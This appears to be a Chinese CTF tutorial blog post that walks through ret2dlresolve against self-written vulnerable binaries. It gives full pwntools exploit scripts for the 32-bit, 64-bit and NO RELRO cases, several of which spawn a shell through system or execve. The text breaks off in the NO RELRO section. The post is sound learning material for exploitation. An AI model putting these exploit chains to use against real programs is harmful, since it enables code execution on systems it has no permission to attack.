---
layout: post
title: ret2dlresolve小记
category: system/StackOverflow
date: 2024-06-05 12:00:00
---
ret2dlresolve小记

[toc]

本文写于`2024.6.5`。

在入门时学了`ret2dlresolve`后，几乎没有遇到过只能打`dlresolve`的题目，因此几乎已经忘得差不多了。听闻东北`CISCN`分区赛出了一道，刚好借此机会来重新学习一下。

# 可能遇到的问题

> 在`_dl_fixup`函数中报错了？

如果你使用了栈迁移，那么可以检查栈和`dlresolve`的`payload`是否离`bss`起始地址太近。

在`_dl_runtime_resolve`函数中，程序会对栈进行多次抬高和降低操作，因此需要将这些数据尽量放到更远的地方。

> NO RELRO的情况下需要修改DYNAMIC段的指针，而IDA中该指针位于IDA看不到的地方，怎么办？

**你是否已经`patch`了`libc`？如果是，请用一个没有`patch`的附件进行查看。**

若没有，那么请参照如下方式：

使用`pwntools`来查看`dynstr`表的地址：

```python
print(hex(elf.get_section_by_name('.dynstr').header.sh_addr))
```

然后在`gdb`中使用`search -8`来搜索该地址，如上一步中若得到值`0x3fd450`，则在`gdb`中搜索如下：

```bash
search -8 0x3fd450
```

或者在`pwntools`中查找`dynamic`地址：

```python
print(hex(elf.get_section_by_name('.dynamic').header.sh_addr))
```

并使用`gdb`在这一段来查找上一步中找到的`dynstr`地址。

# 32位

以我自己写的一个小程序为例子：

```c
#include<stdio.h>

void vuln()
{
    char content[0x100];
    read(0, content, 0x200);
}

int main(){
    vuln();
    return 0;
}
```

为什么要使用`vuln`函数而不是直接写在主程序中呢？这是因为笔者发现编译后主程序中的`esp`会由栈上`ebp`上面的某个栈指针决定。为了将重心转移到`ret2dlresolve`的利用手法，我们暂且使用一个函数来进行溢出。

使用如下命令编译程序：

```bash
gcc -o pwn ./pwn.c -m32 -no-pie -fno-stack-protector
# 32位编译
# 关闭PIE
# 关闭canary
```

后面，我们会以该程序为例子，一步一步理清楚`ret2dlresolve`的流程。

**而本文中我们不会以`wiki`上的`ROPutils`为例子，也不会用到`readelf`等其他工具**（这是我为了尽可能减小学习成本）。

## 0x00. 总体预览

这个图是来自于[hollk师傅](https://hollk.blog.csdn.net/article/details/107378159)的图。先放在这里，因为不理解很正常。

![在这里插入图片描述](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202406051452853.png)

## 0x01. 栈迁移到bss

由于函数结束时会调用`leave ret`，我们这一步只需要覆盖`ebp`为`base_addr - 4`，并栈溢出来执行一个`read`函数来`read`到`base_addr`，最后将返回地址再设置到`leave ret`即可完成栈迁移。这里不明白的话，需要去学习一下栈迁移。

而此处我的`base_addr`的值为`bss`的基地址`+0x800`，这里实际上只需要在`bss`上任何一段可用地址即可。

`exp`（当前）：

```python
from pwn import *
from LibcSearcher import *
from ae64 import AE64
from ctypes import cdll

filename = './pwn'
context.arch='i386'
context.log_level = "debug"
context.terminal = ['tmux', 'neww']
local = 1
all_logs = []
elf = ELF(filename)
libc = elf.libc

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', )

def debug(params=''):
    for an_log in all_logs:
        success(an_log)
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid, params)
    pause()

def leak_info(name, addr):
    output_log = '{} => {}'.format(name, hex(addr))
    all_logs.append(output_log)
    success(output_log)

bss = elf.bss()
base_addr = bss + 0x800
leave_ret = 0x0804915F
start_resolve = 0x8049030

leak_info('base_addr', base_addr)

payload = b'a'*0x108 + p32(base_addr-4) + p32(elf.plt['read']) + p32(leave_ret) + p32(0) + p32(base_addr) + p32(0x200)
sh.send(payload)

payload = p32(elf.plt['read']) + p32(0xdeadbeaf) + p32(0) + p32(bss + 0x200) + p32(0x200)
sh.send(payload)
```

运行上面的`exp`后，栈会被迁移到`bss`上，并再次执行一个新的`read`函数。这个`read`函数是我们最终要执行的函数，在一切就绪时，我们会把`read`函数改为`system`等任何我们想要的函数。现在，由于程序没有任何函数给我们使用，我们假设执行`read`。

## 0x02. 模拟plt表的绑定过程

观察`plt`表，实际上为如下两条指令：

```c
.plt:08049056                 push    8
.plt:0804905B                 jmp     sub_8049030
```

可以看到，程序先往栈上`push`了一个`8`，随后跳转到了一个函数，而该函数则为`dl_runtime_resolve`的函数。那么，本步骤中，我们模拟`plt`表的绑定过程，只需要往栈上手动写一个`8`，随后跳转到该函数即可（`0x8049030`）。

目前的`exp`如下：

```python
from pwn import *
from LibcSearcher import *
from ae64 import AE64
from ctypes import cdll

filename = './pwn'
context.arch='i386'
context.log_level = "debug"
context.terminal = ['tmux', 'neww']
local = 1
all_logs = []
elf = ELF(filename)
libc = elf.libc

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', )

def debug(params=''):
    for an_log in all_logs:
        success(an_log)
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid, params)
    pause()

def leak_info(name, addr):
    output_log = '{} => {}'.format(name, hex(addr))
    all_logs.append(output_log)
    success(output_log)

bss = elf.bss()
base_addr = bss + 0x800
leave_ret = 0x0804915F
start_resolve = 0x8049030

leak_info('base_addr', base_addr)

payload = b'a'*0x108 + p32(base_addr-4) + p32(elf.plt['read']) + p32(leave_ret) + p32(0) + p32(base_addr) + p32(0x200)
sh.send(payload)

payload = p32(start_resolve) + p32(8) + p32(0xdeadbeaf) + p32(0) + p32(bss + 0x200) + p32(0x200)
sh.send(payload)
```

## 0x03. 伪造reloc_index

到这一步，我们就正式开始进行`ret2dlresolve`了。

再次回顾这个图：

![在这里插入图片描述](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202406051458206.png)

我们上一步中往栈上`push`了一个`0x8`，实际上这就是图里面的`reloc_index`。而`0x8`是什么呢？

实际上，这是`.rel.plt`段的基地址和`write`函数的`Elf32_Rel`结构体的偏移。

`.rel.plt`段我们可以直接用`ida`查看：

![image-20240605150241386](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202406051502444.png)

图中，红框中即为`.rel.plt`段的内容，其为每个函数的`Elf32_Rel`结构体组成的。我们现在不用管这个结构体的内容，我们这一步只需要在栈上，也就是`bss`上伪造一个一模一样的结构体就可以了。该结构体定义如下：

```c
typedef struct{
  Elf32_Addr r_offset; // 图里面可以看到当前是0x804c00c，实则为got表的地址，但我们不用管
  Elf32_Word r_info;   // 图里面可以看到当前是0x207。
}Elf32_Rel
```

而伪造到栈上后，我们往栈上`push`的值就不再是`0x8`了，因为`0x8`是原本的结构体和`.rel.plt`基地址的偏移。

因此，我们需要计算我们伪造的结构体和`.rel.plt`基地址的差，并替换掉原本的`0x8`。

而`.rel.plt`的基地址从图里面就可以看到(`0x80482f4`)，或者也可以用`pwntools`来以如下方式查看：

```python
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
```

替换后，当前的`exp`如下所示：

```python
from pwn import *
from LibcSearcher import *
from ae64 import AE64
from ctypes import cdll

filename = './pwn'
context.arch='i386'
context.log_level = "debug"
context.terminal = ['tmux', 'neww']
local = 1
all_logs = []
elf = ELF(filename)
libc = elf.libc

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', )

def debug(params=''):
    for an_log in all_logs:
        success(an_log)
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid, params)
    pause()

def leak_info(name, addr):
    output_log = '{} => {}'.format(name, hex(addr))
    all_logs.append(output_log)
    success(output_log)

bss = elf.bss()
base_addr = bss + 0x800
leave_ret = 0x0804915F
start_resolve = 0x8049030
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr

leak_info('base_addr', base_addr)
leak_info('rel_plt', rel_plt)

payload = b'a'*0x108 + p32(base_addr-4) + p32(elf.plt['read']) + p32(leave_ret) + p32(0) + p32(base_addr) + p32(0x200)
sh.send(payload)

payload = p32(start_resolve) + p32(base_addr + 0x18 - rel_plt) + p32(0xdeadbeaf) + p32(0) + p32(bss + 0x200) + p32(0x200)
payload += p32(0x804C010) + p32(0x207) # fake Elf32_Rel结构体
sh.send(payload)
```

## 0x04. 伪造dynsym

实际上，我们就是在一步步伪造图里面的所有结构体。再次回顾该图如下：

![在这里插入图片描述](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202406051512670.png)

那么这一步，我们应该继续伪造左边的`.dynsym`了。

程序找到这个结构体是对`.dynsym`基地址来通过上一步中讲的`Elf32_Rel`结构体中的`r_info`右移`8`位的值当作偏移来得到的。

`.dynsym`段如下红框中所示：

![image-20240605151726335](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202406051517400.png)

`ida`中我们可以选择要看的结构体，按下`ctrl+NUM+`，可以展开看该结构体：

![image-20240605152412221](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202406051524274.png)

而上一步中我们写的`r_info`为`0x207`，右移`8`位得到`2`，即是在`Elf32_Sym`中的第二个结构体（以`0`开始算）。

这里，我们和上一步一样的，在栈上伪造该`Elf32_Sym`结构体，将其直接原封不动地抄过来，并更改偏移`r_info`。

`Elf32_Sym`结构体的定义如下所示：

```c
typedef struct
{
  Elf32_Word    st_name;  // 4字节，这里可以简单计算一下是0x22
  Elf32_Addr    st_value; // 4字节，此处可以看到是0
  Elf32_Word    st_size;  // 4字节, 此处可以看到是0
  unsigned char st_info;  // 1字节，此处是0x12
  unsigned char st_other; // 1字节，此处是0
  Elf32_Section st_shndx; // 2字节，此处是0
}Elf32_Sym;
```

需要注意两点：

- `Elf32_Sym`结构体要求地址对齐。例如我们这里的`Elf32_Sym`是以`0xc`结尾的，那么我们伪造的结构体地址也需要以`0xc`结尾。
- `r_info`计算方式为伪造的结构体基地址减去`dynsym`的基地址来作为下标，左移八位后再与上`0x7`。这里推荐读者想一下而不是直接用，因为非常简单，不难理解。

此外，我们除了直接从`ida`上面看，也仍然可以通过如下方式查看`dynsym`的基地址：

```python
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
```

那么`r_info`如下：

```python
r_info = (((base_addr + 0x20 - dynsym) // 0x10) << 8) | 0x7
```

因此，当前的`exp`如下：

```python
from pwn import *
from LibcSearcher import *
from ae64 import AE64
from ctypes import cdll

filename = './pwn'
context.arch='i386'
context.log_level = "debug"
context.terminal = ['tmux', 'neww']
local = 1
all_logs = []
elf = ELF(filename)
libc = elf.libc

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', )

def debug(params=''):
    for an_log in all_logs:
        success(an_log)
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid, params)
    pause()

def leak_info(name, addr):
    output_log = '{} => {}'.format(name, hex(addr))
    all_logs.append(output_log)
    success(output_log)

bss = elf.bss()
base_addr = bss + 0x800
leave_ret = 0x0804915F
start_resolve = 0x8049030
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
r_info = (((base_addr + 0x20 - dynsym) // 0x10) << 8) | 0x7

leak_info('base_addr', base_addr)
leak_info('rel_plt', rel_plt)
leak_info('dynsym', dynsym)

payload = b'a'*0x108 + p32(base_addr-4) + p32(elf.plt['read']) + p32(leave_ret) + p32(0) + p32(base_addr) + p32(0x200)
sh.send(payload)

payload = p32(start_resolve) + p32(base_addr + 0x18 - rel_plt) + p32(0xdeadbeaf) + p32(0) + p32(bss + 0x200) + p32(0x200)
payload += p32(0x804C010) + p32(r_info) # fake Elf32_Rel结构体
payload += b'a' * 0x0 # 此处我的base_addr已经以0xc对齐，因此没有改动。若不对齐，需要以无关字符填充，使得下面这一行是0xc对齐的
payload += p32(0x22) + p32(0) + p32(0) + p32(0x12) # 4字节的st_name， 4字节的st_value， 4字节的st_size，和其他
sh.send(payload)
```

## 0x05. 伪造dynstr

若读者是一步一步看到这个地方，应该已经可以猜到我们这里要怎么做了。

是的，我们只需要再在栈上写一个假的函数名字符串`read`就可以。

而这个偏移本身是来自于`Elf32_Sym`结构体中的`st_name`，在我们的例子中原本是`0x22`。计算偏移，替换即可。

如图：

![image-20240605153649735](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202406051536802.png)

那么当前的`exp`如下：

```python
from pwn import *
from LibcSearcher import *
from ae64 import AE64
from ctypes import cdll

filename = './pwn'
context.arch='i386'
context.log_level = "debug"
context.terminal = ['tmux', 'neww']
local = 1
all_logs = []
elf = ELF(filename)
libc = elf.libc

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', )

def debug(params=''):
    for an_log in all_logs:
        success(an_log)
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid, params)
    pause()

def leak_info(name, addr):
    output_log = '{} => {}'.format(name, hex(addr))
    all_logs.append(output_log)
    success(output_log)

bss = elf.bss()
base_addr = bss + 0x800
leave_ret = 0x0804915F
start_resolve = 0x8049030
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
r_info = (((base_addr + 0x20 - dynsym) // 0x10) << 8) | 0x7
st_name = base_addr + 0x30 - dynstr

leak_info('base_addr', base_addr)
leak_info('rel_plt', rel_plt)
leak_info('dynsym', dynsym)
leak_info('dynstr', dynstr)

payload = b'a'*0x108 + p32(base_addr-4) + p32(elf.plt['read']) + p32(leave_ret) + p32(0) + p32(base_addr) + p32(0x200)
sh.send(payload)

payload = p32(start_resolve) + p32(base_addr + 0x18 - rel_plt) + p32(0xdeadbeaf) + p32(0) + p32(bss + 0x200) + p32(0x200)
payload += p32(0x804C010) + p32(r_info) # fake Elf32_Rel结构体
payload += b'a' * 0x0 # 此处我的base_addr已经以0xc对齐，因此没有改动。若不对齐，需要以无关字符填充，使得下面这一行是0xc对齐的
payload += p32(st_name) + p32(0) + p32(0) + p32(0x12) # 4字节的st_name， 4字节的st_value， 4字节的st_size，和其他
payload += b'read\x00' # 伪造的dynstr字符串
sh.send(payload)
```

## 0x06. 修改字符串，执行任意函数

我们执行的函数，实际上最终就是解析到的字符串的函数。

因此，我们修改该字符串，将其改为任意函数名，例如`system`，即可执行`system`函数！

我们这里改为`system`，并写下其参数`/bin/sh`，即可`getshell`~

```python
from pwn import *
from LibcSearcher import *
from ae64 import AE64
from ctypes import cdll

filename = './pwn'
context.arch='i386'
context.log_level = "debug"
context.terminal = ['tmux', 'neww']
local = 1
all_logs = []
elf = ELF(filename)
libc = elf.libc

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', )

def debug(params=''):
    for an_log in all_logs:
        success(an_log)
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid, params)
    pause()

def leak_info(name, addr):
    output_log = '{} => {}'.format(name, hex(addr))
    all_logs.append(output_log)
    success(output_log)

bss = elf.bss()
base_addr = bss + 0x800
leave_ret = 0x0804915F
start_resolve = 0x8049030
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
r_info = (((base_addr + 0x20 - dynsym) // 0x10) << 8) | 0x7
st_name = base_addr + 0x30 - dynstr

leak_info('base_addr', base_addr)
leak_info('rel_plt', rel_plt)
leak_info('dynsym', dynsym)
leak_info('dynstr', dynstr)

payload = b'a'*0x108 + p32(base_addr-4) + p32(elf.plt['read']) + p32(leave_ret) + p32(0) + p32(base_addr) + p32(0x200)
sh.send(payload)

payload = p32(start_resolve) + p32(base_addr + 0x18 - rel_plt) + p32(0xdeadbeaf) + p32(base_addr + 0x100) + p32(0) + p32(0)
payload += p32(0x804C010) + p32(r_info) # fake Elf32_Rel结构体
payload += b'a' * 0x0 # 此处我的base_addr已经以0xc对齐，因此没有改动。若不对齐，需要以无关字符填充，使得下面这一行是0xc对齐的
payload += p32(st_name) + p32(0) + p32(0) + p32(0x12) # 4字节的st_name， 4字节的st_value， 4字节的st_size，和其他
payload += b'system\x00' # 伪造的dynstr字符串
payload = payload.ljust(0x100, b'\x00') + b"/bin/sh\x00"
sh.send(payload)
sh.interactive()
```

## 0x07. 自动化攻击

有个小插曲，笔者本来想着学完之后来自己实现一个自动化的`dlresolve`，没想到其实`pwntools`自带该功能。无妨，原理在很多地方都会用到的。

而对于纯粹的`Partial relro`的`32`位栈溢出`dlresolve`，可以用如下方式来完成自动化攻击。

而用`pwntools`的写法是基于`Ret2dlresolvePayload`函数来的，总体上也分为两种写法。

首先是用`pwntools`的`ROP`模块，而我们并不常用该模块（笔者基本只在`ret2dlresolve`中看到过该模块）。但为了能方便地进行`ret2dlresolve`，我们也可以学习一下。

### ROP模块

使用`ROP`模块只需要获得两个信息：

- 偏移量。这是指的溢出的地方到函数的返回地址的偏移量，而不是到`ebp`。
- 读取长度。这是指的是漏洞程序原本可以读入的最大长度。

举个例子，程序为如下形式：

```c
#include<stdio.h>

void vuln()
{
    char content[0x100];
    read(0, content, 0x200);
}

int main(){
    vuln();
    return 0;
}
```

这里的偏移量是`0x10c`（用`gdb`调的），而读取长度为`0x200`（`read`函数的第三个参数为`0x200`）。

由此，我们写下如下脚本即可：

```python
from pwn import *
from LibcSearcher import *
from ae64 import AE64
from ctypes import cdll

filename = './pwn'
context.arch='i386'
context.log_level = "debug"
context.terminal = ['tmux', 'neww']
local = 1
all_logs = []
elf = ELF(filename)
libc = elf.libc

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', )


offset = 0x10c
read_length = 0x200

rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="execve", args=["/bin/sh\x00", 0, 0])

# data_addr是表示ret2dlresolve的payload存放在什么地址。该参数是Ret2dlresolvePayload类中的一个可选参数。
# 若不主动选择，则会由pwntools挑选一个合适的地址
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

payload = flat({offset:raw_rop, read_length:dlresolve.payload})
sh.send(payload)
print(rop.dump())
sh.interactive()
```

如上所示，我们更改`dlresolve`中的`symbol`即可执行任意函数，修改`args`即可任意控制其参数。

这里我直接打`system`反而没打通，打`execve`即可。

### 不使用ROP模块

在上一步中，我们使用了`ROP`模块，我们可以使用`rop.dump()`来打印出实际的`ROP`链。

```c
0x0000:        0x8049050 read(0, 0x804ce00)
0x0004:        0x804901f <adjust @0x14> add esp, 8; pop ebx; ret
0x0008:              0x0 arg0
0x000c:        0x804ce00 arg1
0x0010:          b'eaaa' <pad>
0x0014:        0x8049030 [plt_init] execve(0x804ce24, 0, 0)
0x0018:           0x4b28 [dlresolve index]
0x001c:          b'haaa' <return address>
0x0020:        0x804ce24 arg0
0x0024:              0x0 arg1
0x0028:              0x0 arg2
```

如上所示（主要观察那一列地址，`0x8049050`开始那一列），我们观察到其就是调用了`read`往`0x804ce00`读`dlresolve`的`payload`（这个地址就是`pwntools`自动挑选的`data_addr`）。随后其模拟了一个`plt`表的调用过程，即模拟压入了`reloc_index`，并执行绑定`plt`表的函数。

而该`index`我们可以直接通过`dlresolve.reloc_index`进行获取。

因此，我们可以仿照这种操作，来自己写一个基于`Ret2dlresolvePayload`的通用`exp`。

```python
from pwn import *
from LibcSearcher import *
from ae64 import AE64
from ctypes import cdll

filename = './pwn'
context.arch='i386'
context.log_level = "debug"
context.terminal = ['tmux', 'neww']
local = 1
all_logs = []
elf = ELF(filename)
libc = elf.libc

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', )

leave_ret = 0x0804915F
start_resolve = 0x8049030
pop_3_ret = 0x0804901f

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=["/bin/sh", 0, 0])

payload = b'a'*0x10c + p32(elf.plt['read']) + p32(pop_3_ret) + p32(0) + p32(dlresolve.data_addr) + p32(0x100)
payload += p32(start_resolve) + p32(dlresolve.reloc_index) + p32(0xdeadbeaf) + p32(dlresolve.real_args[0]) + p32(dlresolve.real_args[1]) + p32(dlresolve.real_args[2])
sh.send(payload)

sh.send(dlresolve.payload)
sh.interactive()
```

我们上面就是一个和其`ROP`模块完全等效的`payload`。这种方式更加灵活。为什么使用了一个`pop_3_ret`（就是`pop`了三个值）的`gadget`呢？因为这三个被`pop`的值是`read`函数的参数嘛，所以我们需要`ret`到后面的`start_resolve`。

总之，只需要知道我们利用`Ret2dlresolvePayload`这个类时，仍然需要手动模拟一下`plt`的绑定过程即可，而其余`payload`和`index`都是不需要我们写和算出来的。

# 64位

`64`位下大同小异，我们这里介绍工具的两种打法。

## 使用ROP模块

对于使用`ROP`模块的打法，和`32`位下不会有任何问题。

对于一个样例题目：

```c
#include <stdio.h>

int main(){
    char content[0x100];
    read(0, content, 0x180);
    
    return 0;
}
```

编译命令如下：

```bash
gcc ./pwn -o pwn -no-pie -fno-stack-protector -z norelro
```

`exp`模板如下：

```python
from pwn import *
from LibcSearcher import *
from ae64 import AE64
from ctypes import cdll

filename = './pwn'
context.arch='amd64'
context.log_level = "debug"
context.terminal = ['tmux', 'neww']
local = 1
all_logs = []
elf = ELF(filename)
libc = elf.libc

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', )

def debug(params=''):
    for an_log in all_logs:
        success(an_log)
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid, params)
    pause()

def leak_info(name, addr):
    output_log = '{} => {}'.format(name, hex(addr))
    all_logs.append(output_log)
    success(output_log)


offset = 0x108
read_length = 0x180

rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=["/bin/sh"])

rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

payload = flat({offset:raw_rop, read_length:dlresolve.payload})
sh.send(payload)
print(rop.dump())
sh.interactive()
```

可以看到，实际上和`32`位的`exp`并无区别，仍然只需要如下两个参数：

- `offset`，表示溢出到程序返回地址的偏移
- `read_length`，表示程序`read`的最大长度

值得注意的是，`ROP`模块也并不是万能的，例如笔者在编译题目时，发现若程序内不含有控制`rdi`和`rsi`的`gadget`，是无法完成利用的。

## 不使用ROP模块的打法

同样的，我们通过上述的`rop.dump()`来看看其是怎么实现的：

```assembly
0x0000:         0x4011d3 pop rdi; ret
0x0008:              0x0 [arg0] rdi = 0
0x0010:         0x4011d1 pop rsi; pop r15; ret
0x0018:         0x404e00 [arg1] rsi = 4214272
0x0020:      b'iaaajaaa' <pad r15>
0x0028:         0x401044 read
0x0030:         0x4011d3 pop rdi; ret
0x0038:         0x404e48 [arg0] rdi = 4214344
0x0040:         0x401020 [plt_init] system
0x0048:            0x30e [dlresolve index]
```

其中第一步的`0x404e00`就是`dlresolve.data_addr`，也就是程序自动挑选的一块存放`dlresolve.payload`的可写区域，我们可以任意挑选。

观察到，其实与`32`位相比，只有传参的变化：我们不再需要将参数放到栈上，而是利用`gadgets`存放到寄存器里。

需要注意的是`dlresolve index`仍然在栈上！

那么，我们可以写`exp`模板如下：

```python
from pwn import *
from LibcSearcher import *
from ae64 import AE64
from ctypes import cdll

filename = './pwn'
context.arch='amd64'
context.log_level = "debug"
context.terminal = ['tmux', 'neww']
local = 1
all_logs = []
elf = ELF(filename)
libc = elf.libc

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', )

def debug(params=''):
    for an_log in all_logs:
        success(an_log)
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid, params)
    pause()

def leak_info(name, addr):
    output_log = '{} => {}'.format(name, hex(addr))
    all_logs.append(output_log)
    success(output_log)

# 准备好如下值
offset = 0x108  # 溢出到返回值的偏移
read_length = 0x180  # 表示漏洞程序的read允许读的长度
start_resolve = 0x401020 # read函数的plt表的push和jmp操作的地址
read_plt = elf.plt['read']
pop_rdi = 0x4011d3
pop_rsi_r15 = 0x4011d1
pop_rdx = 0

# 下面是模板部分，注意有能控制几个参数的gadgets就可以执行几个参数，例如没有rdx的gadget，只能执行带两个参数的函数
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

payload = b'a'*offset + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(dlresolve.data_addr) + p64(0) + p64(read_plt)
payload += p64(pop_rdi) + p64(dlresolve.real_args[0]) 
payload += p64(start_resolve) + p64(dlresolve.reloc_index)

sh.send(payload)
sh.send(dlresolve.payload)

sh.interactive()
```

我们仍然是将`dlresolve.payload`读到某个可写的位置，随后将要执行的函数的参数通过`gadgets`存放到寄存器，最后模拟调用`plt`绑定函数，此时保证栈上有`reloc_index`即可。

# NO RELRO

在`NO RELRO`的情况下，情况会变得比较简单。此外，笔者曾经遇到过一道堆题为`NO RELRO`，拿不到`libc`的任何信息，最后通过`dlresolve`来打通的题目。因此，`NO RELRO`的情况仍然值得学习。而`FULL RELRO`的情况下，`ret2dlresolve`这种方法就不太实用，师傅们遇到的时候尽量选择其他的方法来做。

编译如下程序，笔者这里以`64`位为例子，并且手动添加了一个`pop rdx; ret`的`gadgets`，来方便我们演示。

```c
#include <stdio.h>

asm("pop rdx; ret");

int main(){
    char content[0x100];
    read(0, content, 0x300);
    
    return 0;
}
```

以如下形式编译：

```bash
gcc -o pwn ./pwn.c -no-pie -fno-stack-protector -z norelro -masm=intel
```

程序允许一个非常大的溢出，足够我们构造`ROP`链，但程序里不含有任何输出的函数，因此无法获得`glibc`的相关信息。

由此，我们可以通过`ret2dlresolve`进行攻击。而本题是`NO RELRO`的，这使得我们可以直接伪造一个`dynstr`表，将原本的`read`字符串修改为要执行的函数的函数名即可。相当于我们只需要完成`Paritial RELRO`攻击的最后一步，不过需要我们劫持`DYNAMIC`段中的`dynstr_table`。

我们的攻击分为以下几步：

- `step 0 :`在`bss`上写一个新的`dynstr table (fake)`
- `step 1 :`在`bss`上写一个`/bin/sh`字符串，留作函数参数
- `step 2 :`修改`dynamic`段中的`dynstr`字符串表，将其改为伪造的`dynstr table`的地址
- `step 3 :`给`system`添加参数，手动触发`_dl_runtime_desolve`

那么现在一步一步来看。

## step 0：构造一个fake dynstr table

真实的`dynstr table`位于程序开始的`LOAD`段的末尾处，如下所示：

![image-20240606160645578](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202406061606733.png)

可见这仅仅是一个字符串表而已。我们将里面的`read`字符串换成任何想要执行的函数，例如`system`，并将其放在`bss`段某处即可。

可以通过如下方式来获得这段字符串，并将其中的`read`字符串换成`system`：

```python
dynstr_data = elf.get_section_by_name('.dynstr').data().replace(b'read', b'system')
```

随后只需要在`ROP`链中将其读到`bss`即可，当前`exp`如下：

```python
pop_rdi = 0x4011d3
pop_rsi_r15 = 0x4011d1
pop_rdx = 0x401136
offset = 0x108
fake_table = elf.bss() + 0x200

dynstr_data = elf.get_section_by_name('.dynstr').data().replace(b'read', b'system')

# step 0: 在bss上构建一个fake dynstr table
payload = b'a'*0x108 + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(fake_table) + p64(0xdeadbeaf) + p64(elf.plt['read'])

sh.send(payload)

sh.send(dynstr_data) # fake dynstr table
```

## step 1: 在bss上写一个/bin/sh字符串

最简单的一步，这只是为了最后执行`system`函数的时候有`/bin/sh`字符串可以用。

加上后`exp`如下所示：

```python
pop_rdi = 0x4011d3
pop_rsi_r15 = 0x4011d1
pop_rdx = 0x401136
offset = 0x108
fake_table = elf.bss() + 0x200
binsh_addr = elf.bss() + 0x300

dynstr_data = elf.get_section_by_name('.dynstr').data().replace(b'read', b'system')

# step 0: 在bss上构建一个fake dynstr table
payload = b'a'*0x108 + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(fake_table) + p64(0xdeadbeaf) + p64(elf.plt['read'])
# step 1: 在bss上写一个binsh字符串，作为system函数参数
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(binsh_addr) + p64(0xdeadbeaf) + p64(elf.plt['read'])

sh.send(payload)

sh.send(dynstr_data) # fake dynstr table
sh.send("/bin/sh\x00") # 最终函数参数
```

## step 2: 修改dynamic中的dynstr字符串表

我们在`step0`中伪造了一个假的`dynstr table`，但并没有修改程序中指示该表存放位置的指针。因此，这一步中我们会修改`DYNAMIC`段中的指针，使其指向我们构造的`fake table`。

`DYNAMIC`位于`got`表上方的另一个`LOAD`段，如下所示：

（若你无法找到该段，请移步最上方`可能遇到的问题`）

![image-20240606161524319](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202406061615386.png)

其中存放了各种表的指针。我们选中上方箭头指向的`DT_STRTAB`，按下键盘上的`ctrl + "+"`，即可展开表项：

![image-20240606161540975](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202406061615023.png)

可以看到其指针的地址为`0x4031f0`。我们修改`0x4031f0`处的值为`fake table`的地址即可。

到此的`exp`为：

```python
pop_rdi = 0x4011d3
pop_rsi_r15 = 0x4011d1
pop_rdx = 0x401136
offset = 0x108
dynstr_table_addr = 0x4031f0
fake_table = elf.bss() + 0x200
binsh_addr = elf.bss() + 0x300

dynstr_data = elf.get_section_by_name('.dynstr').data().replace(b'read', b'system')

# step 0: 在bss上构建一个fake dynstr table
payload = b'a'*0x108 + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(fake_table) + p64(0xdeadbeaf) + p64(elf.plt['read'])
# step 1: 在bss上写一个binsh字符串，作为system函数参数
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(binsh_addr) + p64(0xdeadbeaf) + p64(elf.plt['read'])
# step 2: 修改dynamic中的dynstr字符串表，将其改为伪造的dynstr table的地址
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(dynstr_table_addr) + p64(0xdeadbeaf) + p64(elf.plt['read'])

sh.send(payload)

sh.send(dynstr_data) # fake dynstr table
sh.send("/bin/sh\x00") # 最终函数参数
sh.send(p64(fake_table)) # 修改dynstr table指针
```

## step 3: 添加函数参数，手动触发dl_runtime_desolve

我们最终要执行`system`函数，因此需要将`system`函数的参数即`/bin/sh`的地址放到`rdi`中。

观察原本的`read`函数的`plt`表，如下：

